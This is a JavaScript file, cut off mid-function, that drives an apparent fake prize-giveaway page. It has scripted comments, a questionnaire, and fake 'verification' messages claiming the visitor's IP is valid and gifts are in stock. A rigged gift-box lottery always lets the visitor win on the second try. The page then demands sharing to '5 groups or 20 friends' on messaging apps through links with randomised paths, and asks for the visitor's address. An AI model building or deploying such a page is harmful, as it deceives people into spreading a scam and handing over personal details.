class DateUpdater {
    constructor() {
        this.bannerElement = null;
        this.init();
    }
    
    init() {
        this.bannerElement = document.querySelector('.banner-r');
        if (this.bannerElement) {
            this.updateDate();
            setInterval(() => {
                this.updateDate();
            }, 60000);
        }
    }
    
    updateDate() {
        if (!this.bannerElement) return;
        
        const now = new Date();
        const month = (now.getMonth() + 1).toString().padStart(2, '0');
        const day = now.getDate().toString().padStart(2, '0');
        const year = now.getFullYear();
        
        const formattedDate = `${month}/${day}/${year}`;
        this.bannerElement.textContent = formattedDate;
    }
}

class LazyLoader {
    constructor() {
        this.observer = null;
        this.init();
    }
    
    init() {
        if ('IntersectionObserver' in window) {
            this.observer = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        this.loadImage(entry.target);
                    }
                });
            }, { rootMargin: '50px' });
            
            setTimeout(() => {
                this.observeImages();
            }, 100);
        } else {
            this.loadAllImages();
        }
    }
    
    observeImages() {
        const lazyImages = document.querySelectorAll('img[data-src]');
        lazyImages.forEach(img => {
            if (this.observer) {
                this.observer.observe(img);
            } else {
                this.loadImage(img);
            }
        });
    }
    
    loadImage(img) {
        const src = img.getAttribute('data-src');
        if (src) {
            img.src = src;
            img.classList.add('loaded');
            img.removeAttribute('data-src');
            
            if (img.classList.contains('gift-prize')) {
                img.style.opacity = '0';
                img.style.transform = 'scale(0.8)';
            }
            
            if (this.observer) {
                this.observer.unobserve(img);
            }
        }
    }
    
    loadAllImages() {
        const lazyImages = document.querySelectorAll('img[data-src]');
        lazyImages.forEach(img => this.loadImage(img));
    }
}

let comments = [];

let questions = [];

let currentQuestion = 1;
let totalQuestions = 0;
let answers = {};

function loadComments() {
    const container = document.getElementById('cmt');
    if (!container) {
        return;
    }
    
    container.innerHTML = '';

    if (!window.$t || !window.$t.isLoaded) {
        comments = [];
        return;
    }

    comments = $t.t('c_data') || [];

    comments.forEach((comment, index) => {
        const commentDiv = document.createElement('div');
        commentDiv.className = 'comment';
        commentDiv.innerHTML = `
            <div class="comment-avatar">
                <img data-src="${comment.avatar}" class="lazy" />
            </div>
            <div class="comment-content">
                <div class="comment-author">${comment.author}</div>
                <div class="comment-text">${$t.replaceTags(comment.text)}</div>
                <div class="comment-actions">
                    <div class="thumbs">
                        <span class="thumb" onclick="likeComment(this)">
                            <svg width="14px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                                <path d="M466.3 286.7C475 271.8 480 256 480 236.9c0-44-37.2-85.6-85.8-85.6H357.7c4.9-12.8 8.9-28.1 8.9-46.5C366.6 31.9 328.9 0 271.3 0c-61.6 0-58.1 94.9-71.8 108.6-22.7 22.7-49.6 66.4-68.8 83.4H32c-17.7 0-32 14.3-32 32v240c0 17.7 14.3 32 32 32h64c14.9 0 27.4-10.2 31-24 44.5 1 75.1 39.9 177.8 39.9 7.2 0 15.2 0 22.2 0 77.1 0 112-39.4 112.9-95.3 13.3-18.4 20.3-43.1 17.3-67 9.9-18.5 13.7-40.3 9-63zm-61.8 53.8c12.6 21.1 1.3 49.4-13.9 57.6 7.7 48.8-17.6 65.9-53.1 65.9h-37.8c-71.6 0-118-37.8-171.6-37.8V240h10.9c28.4 0 68-70.9 94.5-97.5 28.4-28.4 18.9-75.6 37.8-94.5 47.3 0 47.3 33 47.3 56.7 0 39.2-28.4 56.7-28.4 94.5h104c21.1 0 37.7 18.9 37.8 37.8 .1 18.9-12.8 37.8-22.3 37.8 13.5 14.6 16.4 45.2-5.2 65.6zM88 432c0 13.3-10.7 24-24 24s-24-10.7-24-24 10.7-24 24-24 24 10.7 24 24z"></path>
                            </svg>
                        </span>
                        <span class="thumb" onclick="dislikeComment(this)">
                            <svg width="14px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                                <path d="M466.3 225.3c4.7-22.6 .9-44.5-9-63 3-23.9-4-48.6-17.3-67C439 39.4 404.1 0 327 0c-7 0-15 0-22.2 0C201.2 0 169 40 128 40h-10.8c-5.6-5-13-8-21.2-8H32C14.3 32 0 46.3 0 64v240c0 17.7 14.3 32 32 32h64c11.8 0 22.2-6.4 27.7-16h7.1c19.1 17 46 60.7 68.8 83.4 13.7 13.7 10.2 108.6 71.8 108.6 57.6 0 95.3-31.9 95.3-104.7 0-18.4-3.9-33.7-8.9-46.5h36.5c48.6 0 85.8-41.6 85.8-85.6 0-19.2-5-35-13.7-49.8zM64 296c-13.3 0-24-10.7-24-24s10.7-24 24-24 24 10.7 24 24-10.7 24-24 24zm330.2 16.7H290.2c0 37.8 28.4 55.4 28.4 94.5 0 23.8 0 56.7-47.3 56.7-18.9-18.9-9.5-66.2-37.8-94.5C206.9 342.9 167.3 272 138.9 272H128V85.8c53.6 0 100-37.8 171.6-37.8h37.8c35.5 0 60.8 17.1 53.1 65.9 15.2 8.2 26.5 36.4 13.9 57.6 21.6 20.4 18.7 51.1 5.2 65.6 9.5 0 22.4 18.9 22.3 37.8-.1 18.9-16.7 37.8-37.8 37.8z"></path>
                            </svg>
                        </span>
                    </div>
                    <span class="comment-time">${comment.time}</span>
                </div>
            </div>
        `;
        container.appendChild(commentDiv);
    });
    
    if (window.lazyLoader) {
        window.lazyLoader.observeImages();
    } else {
        const lazyImages = document.querySelectorAll('img[data-src]');
        lazyImages.forEach(img => {
            const src = img.getAttribute('data-src');
            if (src) {
                img.src = src;
                img.classList.add('loaded');
                img.removeAttribute('data-src');
                
                if (img.classList.contains('gift-prize')) {
                    img.style.opacity = '0';
                    img.style.transform = 'scale(0.8)';
                }
            }
        });
    }
}

function likeComment(element) {
    element.style.color = '#0066cc';
    setTimeout(() => {
        element.style.color = '#666';
    }, 200);
}

function dislikeComment(element) {
    element.style.color = '#e60012';
    setTimeout(() => {
        element.style.color = '#666';
    }, 200);
}

function renderQuestion() {
    if (!window.$t || !window.$t.isLoaded) {
        return;
    }
    
    questions = $t.t('q') || {};
    const questionKeys = Object.keys(questions).filter(key => key.startsWith('q'));
    totalQuestions = questionKeys.length;
    
    const questionKey = questionKeys[currentQuestion - 1];
    const question = questions[questionKey];
    const questionSection = document.getElementById('q');
    
    if (!questionSection) {
        return;
    }
    
    if (!question) {
        return;
    }
    
    const buttonsHTML = `
        <div class="question-buttons">
            <div class="options-container">
                ${question.options.map(option => `
                    <div class="btn" onclick="selectOption(this, '${option}')">
                        <input type="radio" name="question${currentQuestion}" value="${option}">
                        <span>${option}</span>
                    </div>
                `).join('')}
            </div>
        </div>
    `;
    
    const processedQuestionText = $t.replaceTags(question.text);
    const formatTemplate = $t.t('q.format') || 'Question {{current}} of {{total}} : {{text}}';
    const questionText = $t.replaceTags(formatTemplate, {
        current: currentQuestion,
        total: totalQuestions,
        text: processedQuestionText
    });
    
    questionSection.innerHTML = `
        <div class="question">${questionText}</div>
        ${buttonsHTML}
    `;
}

function selectOption(element, value) {
    
    const group = element.closest('.options-container');
    const options = group.querySelectorAll('.btn');
    options.forEach(option => option.classList.remove('selected'));
    
    element.classList.add('selected');
    element.querySelector('input[type="radio"]').checked = true;
    
    nextQuestion();
}

function nextQuestion() {
    currentQuestion++;
    
    if (currentQuestion > totalQuestions) {
        showVerificationProcess();
    } else {
        renderQuestion();
    }
}

function showVerificationProcess() {
    const mainContent = document.querySelector('.main-content');
    if (mainContent) {
        mainContent.style.display = 'none';
    }
    
    const verificationContainer = document.getElementById('verify');
    const messagesContainer = document.getElementById('msg');
    const loadingSpinner = document.querySelector('.loading-spinner');
    
    if (verificationContainer && messagesContainer && loadingSpinner) {
        verificationContainer.style.display = 'block';
        
        const messages = $t.t('v.msg') || [
            "You have answered all 4 questions",
            "Your IP address is valid for this promotion", 
            "Gifts are available and in stock!"
        ];
        
        let currentMessage = 0;
        const showNextMessage = () => {
            if (currentMessage < messages.length) {
                const messageDiv = document.createElement('div');
                messageDiv.textContent = messages[currentMessage];
                messageDiv.className = 'verification-message';
                messagesContainer.appendChild(messageDiv);
                
                currentMessage++;
                setTimeout(showNextMessage, 1500);
            } else {
                showVerificationSuccess();
                setTimeout(showCongratulationsModal, 800);
            }
        };
        
        messagesContainer.innerHTML = '';
        loadingSpinner.style.display = 'block';
        setTimeout(showNextMessage, 1000);
    }
}

function showVerificationSuccess() {
    const loadingSpinner = document.querySelector('.loading-spinner');
    if (loadingSpinner) {
        loadingSpinner.style.display = 'none';
        
        const successIcon = document.createElement('div');
        successIcon.className = 'verification-success-icon';
        successIcon.innerHTML = `
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="currentColor"/>
            </svg>
        `;
        
        loadingSpinner.parentNode.insertBefore(successIcon, loadingSpinner.nextSibling);
    }
}

function showCongratulationsModal() {
    const modalOverlay = document.getElementById('modal');
    if (modalOverlay) {
        modalOverlay.style.display = 'flex';
    }
}

function closeModal() {
    const modalOverlay = document.getElementById('modal');
    if (modalOverlay) {
        modalOverlay.style.display = 'none';
    }
    
    const verificationContainer = document.getElementById('verify');
    if (verificationContainer) {
        verificationContainer.style.display = 'none';
    }
    
    StageManager.nextStage();
}


function preloadGiftImages() {
    return new Promise((resolve) => {
        const giftAssets = $t.t('img.gifts');
        if (!giftAssets) {
            resolve();
            return;
        }
        
        const currentPrizeImage = $t.getCurrentPrizeImage();
        const imagesToLoad = [
            giftAssets.lid,
            giftAssets.lining,
            giftAssets.body,
            currentPrizeImage
        ].filter(Boolean);
        
        let loadedCount = 0;
        const totalImages = imagesToLoad.length;
        
        if (totalImages === 0) {
            resolve();
            return;
        }
        
        
        imagesToLoad.forEach(src => {
            const img = new Image();
            img.onload = () => {
                loadedCount++;
                if (loadedCount === totalImages) {
                    resolve();
                }
            };
            img.onerror = () => {
                loadedCount++;
                if (loadedCount === totalImages) {
                    resolve();
                }
            };
            img.src = src;
        });
    });
}

function generateGiftBoxes() {
    const lotteryGrid = document.getElementById('grid');
    if (!lotteryGrid) return;
    
    lotteryGrid.innerHTML = '';
    
    const giftAssets = $t.t('img.gifts');
    if (!giftAssets) {
        return;
    }
    
    const currentPrizeImage = $t.getCurrentPrizeImage();
    
    for (let i = 1; i <= 9; i++) {
        const giftBox = document.createElement('div');
        giftBox.className = 'gift-box';
        giftBox.setAttribute('data-box', i);
        giftBox.onclick = () => selectGiftBox(i);
        
        giftBox.innerHTML = `
            <img class="gift-lid" src="${giftAssets.lid}">
            <img class="gift-lining" src="${giftAssets.lining}">
            <img class="gift-prize" src="${currentPrizeImage}" style="opacity: 0; transform: scale(0.8);">
            <img class="gift-body" src="${giftAssets.body}">
        `;
        
        lotteryGrid.appendChild(giftBox);
    }
    
    if (window.lazyLoader) {
        window.lazyLoader.observeImages();
    } else {
        const lazyImages = document.querySelectorAll('img[data-src]');
        lazyImages.forEach(img => {
            const src = img.getAttribute('data-src');
            if (src) {
                img.src = src;
                img.classList.add('loaded');
                img.removeAttribute('data-src');
                
                if (img.classList.contains('gift-prize')) {
                    img.style.opacity = '0';
                    img.style.transform = 'scale(0.8)';
                }
            }
        });
    }
}

const StageManager = {
    STAGES: {
        QUESTIONNAIRE: 'questionnaire',
        LOTTERY: 'lottery',
        SHARE: 'share',
        COMPLETION: 'completion'
    },
    
    currentStage: null,
    
    getStorageKey(key) {
        const hash = window.I18N_CONFIG?.Hash || 'default';
        return `${hash}_${key}`;
    },
    
    init() {
        this.loadProgress();
        this.showCurrentStage();
    },
    
    saveProgress(stage) {
        try {
            const storageKey = this.getStorageKey('lottery_progress');
            localStorage.setItem(storageKey, JSON.stringify({
                stage: stage,
                timestamp: Date.now()
            }));
            this.currentStage = stage;
        } catch (error) {
        }
    },
    
    loadProgress() {
        try {
            const storageKey = this.getStorageKey('lottery_progress');
            const saved = localStorage.getItem(storageKey);
            if (saved) {
                const progress = JSON.parse(saved);
                const isRecent = (Date.now() - progress.timestamp) < 24 * 60 * 60 * 1000;
                if (isRecent) {
                    this.currentStage = progress.stage;
                    return;
                }
            }
            this.currentStage = this.STAGES.QUESTIONNAIRE;
        } catch (error) {
            this.currentStage = this.STAGES.QUESTIONNAIRE;
        }
    },
    
    showCurrentStage() {
        switch (this.currentStage) {
            case this.STAGES.QUESTIONNAIRE:
                this.showQuestionnaireStage();
                break;
            case this.STAGES.LOTTERY:
                this.showLotteryStage();
                break;
            case this.STAGES.SHARE:
                this.showShareStage();
                break;
            case this.STAGES.COMPLETION:
                this.showCompletionStage();
                break;
            default:
                this.showQuestionnaireStage();
        }
    },
    
    showQuestionnaireStage() {
        this.hideAllStages();
        
        const mainContent = document.querySelector('.main-content');
        if (mainContent) {
            mainContent.style.display = 'block';
        }
        
        
        currentQuestion = 1;
        answers = {};
        renderQuestion();
        
        preloadGiftImages().then(() => {
        }).catch(error => {
        });
    },
    
    
    showLotteryStage() {
        this.hideAllStages();
        
        const lotteryContainer = document.getElementById('lottery');
        if (lotteryContainer) {
            lotteryContainer.style.display = 'block';
        }
        
        
        lotteryAttempts = 0;
        isGiftBoxClicking = false;
        
        generateGiftBoxes();
    },

    showShareStage() {
        this.hideAllStages();
        
        const prizeContainer = document.getElementById('prize');
        if (prizeContainer) {
            prizeContainer.style.display = 'block';
        }
        
        this.updatePrizeImage();
        
        const shareInstructions = document.getElementById('share');
        if (shareInstructions) {
            shareInstructions.style.display = 'block';
        }
        
        const completionVerification = document.getElementById('done');
        if (completionVerification) {
            completionVerification.style.display = 'none';
        }
        
        generateShareButtons();
        
        loadShareProgress();
        
    },

    showCompletionStage() {
        this.hideAllStages();
        
        const prizeContainer = document.getElementById('prize');
        if (prizeContainer) {
            prizeContainer.style.display = 'block';
        }
        
        this.updatePrizeImage();
        
        const shareInstructions = document.getElementById('share');
        if (shareInstructions) {
            shareInstructions.style.display = 'none';
        }
        
        const completionVerification = document.getElementById('done');
        if (completionVerification) {
            completionVerification.style.display = 'block';
        }
        
    },
    
    hideAllStages() {
        const mainContent = document.querySelector('.main-content');
        const lotteryContainer = document.getElementById('lottery');
        const prizeContainer = document.getElementById('prize');
        
        if (mainContent) mainContent.style.display = 'none';
        if (lotteryContainer) lotteryContainer.style.display = 'none';
        if (prizeContainer) prizeContainer.style.display = 'none';
    },
    
    updatePrizeImage() {
        const prizeImage = document.getElementById('pi');
        if (prizeImage) {
            const currentPrizeImage = $t.getCurrentPrizeImage();
            if (currentPrizeImage) {
                prizeImage.setAttribute('data-src', currentPrizeImage);
                prizeImage.setAttribute('alt', $t.getCurrentPrize());
                
                if (prizeImage.classList.contains('loaded')) {
                    prizeImage.src = currentPrizeImage;
                }
            }
        }
    },
    
    
    nextStage() {
        switch (this.currentStage) {
            case this.STAGES.QUESTIONNAIRE:
                this.saveProgress(this.STAGES.LOTTERY);
                this.showLotteryStage();
                break;
            case this.STAGES.LOTTERY:
                this.saveProgress(this.STAGES.SHARE);
                this.showShareStage();
                break;
            case this.STAGES.SHARE:
                this.saveProgress(this.STAGES.COMPLETION);
                this.showCompletionStage();
                break;
            case this.STAGES.COMPLETION:
                break;
        }
    },
    
};

let lotteryAttempts = 0;
const maxAttempts = 2;
let isGiftBoxClicking = false;

function selectGiftBox(boxNumber) {
    if (isGiftBoxClicking) {
        return;
    }
    
    const giftBox = document.querySelector(`[data-box="${boxNumber}"]`);
    if (!giftBox) return;
    
    if (giftBox.classList.contains('opened')) {
        return;
    }
    
    isGiftBoxClicking = true;
    
    giftBox.classList.add('opened');
    
    lotteryAttempts++;
    
    if (lotteryAttempts === 1) {
        giftBox.classList.add('no-win');
        setTimeout(() => {
            showNoWinModal();
            isGiftBoxClicking = false;
        }, 1000);
    } else if (lotteryAttempts === 2) {
        giftBox.classList.add('opening');
        setTimeout(() => {
            showWinModal();
            isGiftBoxClicking = false;
        }, 1000);
    }
}

const ModalManager = {
    show(config) {
        const modal = document.getElementById('gmodal');
        if (!modal) return;
        
        this.clearContainers();
        
        if (config.icon) {
            const iconContainer = document.getElementById('icon');
            iconContainer.innerHTML = `<div class="modal-icon">${config.icon}</div>`;
        }
        
        if (config.image) {
            const imageContainer = document.getElementById('img');
            imageContainer.innerHTML = `<div class="modal-image"><img data-src="${config.image}" class="modal-img lazy"></div>`;
        }
        
        if (config.title) {
            const titleContainer = document.getElementById('title');
            titleContainer.innerHTML = `<div class="modal-title">${config.title}</div>`;
        }
        
        if (config.message) {
            const messageContainer = document.getElementById('msg');
            messageContainer.innerHTML = `<div class="modal-message">${config.message}</div>`;
        }
        
        if (config.messageBold) {
            const messageContainer = document.getElementById('msg');
            messageContainer.innerHTML += `<div class="modal-message-bold">${config.messageBold}</div>`;
        }
        
        if (config.rules) {
            const rulesContainer = document.getElementById('rules');
            let rulesHTML = '<div class="modal-rules">';
            if (config.rulesTitle) {
                rulesHTML += `<div class="modal-rules-title">${config.rulesTitle}</div>`;
            }
            config.rules.forEach(rule => {
                rulesHTML += `<div class="modal-rule">${rule}</div>`;
            });
            rulesHTML += '</div>';
            rulesContainer.innerHTML = rulesHTML;
        }
        
        if (config.buttonText) {
            const button = document.getElementById('btn');
            button.textContent = config.buttonText;
            button.onclick = config.onClose || this.hide;
        }
        
        modal.style.display = 'flex';
        
        if (window.lazyLoader) {
            window.lazyLoader.observeImages();
        }
    },
    
    clearContainers() {
        const containers = [
            'icon',
            'img', 
            'title',
            'msg',
            'rules'
        ];
        containers.forEach(id => {
            const container = document.getElementById(id);
            if (container) container.innerHTML = '';
        });
    },
    
    hide() {
        const modal = document.getElementById('gmodal');
        if (modal) {
            modal.style.display = 'none';
        }
    }
};

function showNoWinModal() {
    ModalManager.show({
        icon: '!',
        title: $t.t('l_msg.empty'),
        message: $t.t('l_msg.left', {chances: maxAttempts - lotteryAttempts}),
        buttonText: $t.t('m.ok'),
        onClose: closeNoWinModal
    });
}

function closeNoWinModal() {
    ModalManager.hide();
}

function showWinModal() {
    ModalManager.show({
        image: $t.getCurrentPrizeImage(),
        imageAlt: $t.getCurrentPrize(),
        title: $t.t('m.cong'),
        messageBold: $t.t('l_msg.won'),
        rulesTitle: $t.t('l_msg.rules_title'),
        rules: $t.t('l_msg.rules') || [
            '1. You must tell 5 groups or 20 friends about our promotions.',
            '2. Enter your address and complete registration.',
            '3. The gifts will be delivered within 5-7 days'
        ],
        buttonText: $t.t('m.ok'),
        onClose: closeWinModal
    });
    
    createFireworks();
}

function closeWinModal() {
    ModalManager.hide();
    
    StageManager.nextStage();
}

function createFireworks() {
    const fireworksContainer = document.getElementById('fire');
    if (!fireworksContainer) return;
    
    fireworksContainer.innerHTML = '';
    
    const explosionPoints = [
        { x: 20, y: 30 },
        { x: 50, y: 25 },
        { x: 80, y: 35 },
        { x: 30, y: 60 },
        { x: 70, y: 55 },
        { x: 25, y: 80 },
        { x: 50, y: 75 },
        { x: 75, y: 85 }
    ];
    
    explosionPoints.forEach((point, index) => {
        setTimeout(() => {
            createExplosion(fireworksContainer, point.x, point.y, index);
        }, index * 200);
    });
    
    setTimeout(() => {
        fireworksContainer.innerHTML = '';
    }, 4000);
}

function createExplosion(container, x, y, index) {
    const explosion = document.createElement('div');
    explosion.className = 'firework-explosion';
    explosion.style.left = x + '%';
    explosion.style.top = y + '%';
    explosion.style.background = getRandomColor();
    
    const sparkX = (Math.random() - 0.5) * 200;
    const sparkY = (Math.random() - 0.5) * 200;
    explosion.style.setProperty('--spark-x', sparkX + 'px');
    explosion.style.setProperty('--spark-y', sparkY + 'px');
    
    container.appendChild(explosion);
    
    for (let i = 0; i < 16; i++) {
        const spark = document.createElement('div');
        spark.className = 'firework';
        spark.style.left = x + '%';
        spark.style.top = y + '%';
        spark.style.background = getRandomColor();
        
        const angle = (i / 16) * Math.PI * 2;
        const distance = 120 + Math.random() * 120;
        const sparkX = Math.cos(angle) * distance;
        const sparkY = Math.sin(angle) * distance;
        
        spark.style.setProperty('--random-x', sparkX + 'px');
        spark.style.setProperty('--random-y', sparkY + 'px');
        
        spark.style.animationDelay = Math.random() * 0.5 + 's';
        
        container.appendChild(spark);
    }
}

function getRandomColor() {
    const colors = ['#ff6b6b', '#4ecdc4', '#f9ca24', '#6c5ce7', '#eb4d4b', '#a29bfe', '#45b7d1', '#f0932b'];
    return colors[Math.floor(Math.random() * colors.length)];
}

document.addEventListener('touchstart', function(event) {
    if (event.touches.length > 1) {
        event.preventDefault();
    }
});

document.addEventListener('touchend', function(event) {
    const now = (new Date()).getTime();
    if (now - lastTouchEnd <= 300) {
        event.preventDefault();
    }
    lastTouchEnd = now;
}, false);

let lastTouchEnd = 0;

const sharePlatforms = {
    whatsapp: {
        name: 'WhatsApp',
        color: '#25D366',
        icon: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256"><path fill="#fff" d="M187.3 159.06A36.09 36.09 0 0 1 152 188a84.09 84.09 0 0 1-84-84a36.09 36.09 0 0 1 28.94-35.3A12 12 0 0 1 110 75.1l11.48 23a12 12 0 0 1-.75 12l-8.52 12.78a44.56 44.56 0 0 0 20.91 20.91l12.78-8.52a12 12 0 0 1 12-.75l23 11.48a12 12 0 0 1 6.4 13.06M236 128a108 108 0 0 1-157.23 96.15L46.34 235A20 20 0 0 1 21 209.66l10.81-32.43A108 108 0 1 1 236 128m-24 0a84 84 0 1 0-156.73 42.06a12 12 0 0 1 1 9.81l-9.93 29.79l29.79-9.93a12.1 12.1 0 0 1 3.8-.62a12 12 0 0 1 6 1.62A84 84 0 0 0 212 128"/></svg>',
        shareUrl: 'whatsapp://send?text='
    },
    messenger: {
        name: 'Messenger',
        color: '#006AFF',
        icon: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256"><path fill="#fff" d="M231.49 23.16a13 13 0 0 0-13.23-2.26L15.6 100.21a18.22 18.22 0 0 0 3.12 34.86L68 144.74V200a20 20 0 0 0 34.4 13.88l22.67-23.51L162.35 223a20 20 0 0 0 32.7-10.54l40.62-176.55a13 13 0 0 0-4.18-12.75m-92.08 54.36l-62.19 44.57l-34.43-6.75ZM92 190.06v-28.71l15 13.15Zm81.16 10.52l-73.88-64.77l106.31-76.18Z"/></svg>',
        shareUrl: 'fb-messenger://share/?link='
    },
    telegram: {
        name: 'Telegram',
        color: '#0088cc',
        icon: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256"><path fill="#fff" d="m184.49 120.49l-32 32a12 12 0 0 1-17 0L112 129l-23.51 23.49a12 12 0 0 1-17-17l32-32a12 12 0 0 1 17 0L144 127l23.51-23.52a12 12 0 0 1 17 17ZM236 128a108 108 0 0 1-157.23 96.15L46.34 235A20 20 0 0 1 21 209.66l10.81-32.43A108 108 0 1 1 236 128m-24 0a84 84 0 1 0-156.73 42.05a12 12 0 0 1 1 9.82l-9.93 29.79l29.79-9.93a12.1 12.1 0 0 1 3.8-.62a12 12 0 0 1 6 1.62A84 84 0 0 0 212 128"/></svg>',
        shareUrl: 'tg://msg_url?url='
    },
    line: {
        name: 'Line',
        color: '#00C300',
        icon: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="#fff" d="M311 196.8v81.3c0 2.1-1.6 3.7-3.7 3.7h-13c-1.3 0-2.4-.7-3-1.5l-37.3-50.3v48.2c0 2.1-1.6 3.7-3.7 3.7h-13c-2.1 0-3.7-1.6-3.7-3.7V196.9c0-2.1 1.6-3.7 3.7-3.7h12.9c1.1 0 2.4 .6 3 1.6l37.3 50.3V196.9c0-2.1 1.6-3.7 3.7-3.7h13c2.1-.1 3.8 1.6 3.8 3.5zm-93.7-3.7h-13c-2.1 0-3.7 1.6-3.7 3.7v81.3c0 2.1 1.6 3.7 3.7 3.7h13c2.1 0 3.7-1.6 3.7-3.7V196.8c0-1.9-1.6-3.7-3.7-3.7zm-31.4 68.1H150.3V196.8c0-2.1-1.6-3.7-3.7-3.7h-13c-2.1 0-3.7 1.6-3.7 3.7v81.3c0 1 .3 1.8 1 2.5c.7 .6 1.5 1 2.5 1h52.2c2.1 0 3.7-1.6 3.7-3.7v-13c0-1.9-1.6-3.7-3.5-3.7zm193.7-68.1H327.3c-1.9 0-3.7 1.6-3.7 3.7v81.3c0 1.9 1.6 3.7 3.7 3.7h52.2c2.1 0 3.7-1.6 3.7-3.7V265c0-2.1-1.6-3.7-3.7-3.7H344V247.7h35.5c2.1 0 3.7-1.6 3.7-3.7V230.9c0-2.1-1.6-3.7-3.7-3.7H344V213.5h35.5c2.1 0 3.7-1.6 3.7-3.7v-13c-.1-1.9-1.7-3.7-3.7-3.7zM512 93.4V419.4c-.1 51.2-42.1 92.7-93.4 92.6H92.6C41.4 511.9-.1 469.8 0 418.6V92.6C.1 41.4 42.2-.1 93.4 0H419.4c51.2 .1 92.7 42.1 92.6 93.4zM441.6 233.5c0-83.4-83.7-151.3-186.4-151.3s-186.4 67.9-186.4 151.3c0 74.7 66.3 137.4 155.9 149.3c21.8 4.7 19.3 12.7 14.4 42.1c-.8 4.7-3.8 18.4 16.1 10.1s107.3-63.2 146.5-108.2c27-29.7 39.9-59.8 39.9-93.1z"/></svg>',
        shareUrl: 'https://line.me/R/share?text='
    },
    viber: {
        name: 'Viber',
        color: '#665CAC',
        icon: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="#fff" d="M444 49.9C431.3 38.2 379.9 .9 265.3 .4c0 0-135.1-8.1-200.9 52.3C27.8 89.3 14.9 143 13.5 209.5c-1.4 66.5-3.1 191.1 117 224.9h.1l-.1 51.6s-.8 20.9 13 25.1c16.6 5.2 26.4-10.7 42.3-27.8 8.7-9.4 20.7-23.2 29.8-33.7 82.2 6.9 145.3-8.9 152.5-11.2 16.6-5.4 110.5-17.4 125.7-142 15.8-128.6-7.6-209.8-49.8-246.5zM457.9 287c-12.9 104-89 110.6-103 115.1-6 1.9-61.5 15.7-131.2 11.2 0 0-52 62.7-68.2 79-5.3 5.3-11.1 4.8-11-5.7 0-6.9 .4-85.7 .4-85.7-.1 0-.1 0 0 0-101.8-28.2-95.8-134.3-94.7-189.8 1.1-55.5 11.6-101 42.6-131.6 55.7-50.5 170.4-43 170.4-43 96.9 .4 143.3 29.6 154.1 39.4 35.7 30.6 53.9 103.8 40.6 211.1zm-139-80.8c.4 8.6-12.5 9.2-12.9 .6-1.1-22-11.4-32.7-32.6-33.9-8.6-.5-7.8-13.4 .7-12.9 27.9 1.5 43.4 17.5 44.8 46.2zm20.3 11.3c1-42.4-25.5-75.6-75.8-79.3-8.5-.6-7.6-13.5 .9-12.9 58 4.2 88.9 44.1 87.8 92.5-.1 8.6-13.1 8.2-12.9-.3zm47 13.4c.1 8.6-12.9 8.7-12.9 .1-.6-81.5-54.9-125.9-120.8-126.4-8.5-.1-8.5-12.9 0-12.9 73.7 .5 133 51.4 133.7 139.2zM374.9 329v.2c-10.8 19-31 40-51.8 33.3l-.2-.3c-21.1-5.9-70.8-31.5-102.2-56.5-16.2-12.8-31-27.9-42.4-42.4-10.3-12.9-20.7-28.2-30.8-46.6-21.3-38.5-26-55.7-26-55.7-6.7-20.8 14.2-41 33.3-51.8h.2c9.2-4.8 18-3.2 23.9 3.9 0 0 12.4 14.8 17.7 22.1 5 6.8 11.7 17.7 15.2 23.8 6.1 10.9 2.3 22-3.7 26.6l-12 9.6c-6.1 4.9-5.3 14-5.3 14s17.8 67.3 84.3 84.3c0 0 9.1 .8 14-5.3l9.6-12c4.6-6 15.7-9.8 26.6-3.7 14.7 8.3 33.4 21.2 45.8 32.9 7 5.7 8.6 14.4 3.8 23.6z"/></svg>',
        shareUrl: 'viber://forward?text='
    }
};

const progressPercents = [50, 50, 70, 70, 75, 85, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100];
let currentShareStep = 0;
let toPlatform = '';

let cachedShareDomain = null;
let domainFetchPromise = null;


function generateShareButtons() {
    const shareButtonsContainer = document.querySelector('.share-buttons');
    if (!shareButtonsContainer) return;
    
    shareButtonsContainer.innerHTML = '';
    
    if (typeof $t === 'undefined' || !$t.getEnabledPlatforms) {
        Object.keys(sharePlatforms).forEach(platformKey => {
            const platform = sharePlatforms[platformKey];
            const button = document.createElement('button');
            button.className = `share-btn ${platformKey}-btn`;
            button.style.backgroundColor = platform.color;
            button.onclick = () => shareToPlatform(platformKey);
            
            button.innerHTML = `
                <div class="share-content">
                    <div class="share-icon">
                        ${platform.icon}
                    </div>
                    <span class="share-text">${platform.name}</span>
                </div>
            `;
            
            shareButtonsContainer.appendChild(button);
        });
        return;
    }
    
    const enabledPlatforms = $t.getEnabledPlatforms();
    
    enabledPlatforms.forEach(platformKey => {
        const platform = sharePlatforms[platformKey];
        if (!platform) return;
        
        const button = document.createElement('button');
        button.className = `share-btn ${platformKey}-btn`;
        button.style.backgroundColor = platform.color;
        button.onclick = () => shareToPlatform(platformKey);
        
        button.innerHTML = `
            <div class="share-content">
                <div class="share-icon">
                    ${platform.icon}
                </div>
                <span class="share-text">${platform.name}</span>
            </div>
        `;
        
        shareButtonsContainer.appendChild(button);
    });
}

async function getBackendDomain() {
    if (cachedShareDomain) {
        return cachedShareDomain;
    }
    
    if (domainFetchPromise) {
        return await domainFetchPromise;
    }
    
    domainFetchPromise = fetchBackendDomain();
    try {
        const result = await domainFetchPromise;
        return result;
    } finally {
        domainFetchPromise = null;
    }
}

function generateRandomString() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function buildShareUrl(domain, hash) {
    const randomString = generateRandomString();
    const language = window.$t.getCurrentLanguage();
    const modifiedHash = hash.slice(0, 10);
    const shareUrl = `${domain}/${modifiedHash}/${language}/${randomString}`;
    return shareUrl;
}

async function fetchBackendDomain() {
    try {
